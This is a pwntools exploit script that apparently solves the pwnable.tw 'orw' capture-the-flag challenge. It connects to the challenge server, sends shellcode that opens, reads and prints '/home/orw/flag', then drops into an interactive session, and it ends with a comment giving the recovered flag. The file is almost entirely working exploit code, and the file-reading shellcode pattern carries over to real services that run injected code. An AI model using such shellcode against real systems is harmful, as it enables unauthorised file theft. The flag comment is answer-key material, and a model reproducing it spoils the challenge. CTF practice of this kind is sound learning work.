#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './orw')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10001)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
def main():
    io = start()
    shellcode = asm(shellcraft.open('/home/orw/flag') +
                    shellcraft.read(3, 'esp', 100) +
                    shellcraft.write(1, 'esp', 100))
    io.sendline(shellcode)
    io.interactive()

if __name__ == "__main__":
    main()

#flag: FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
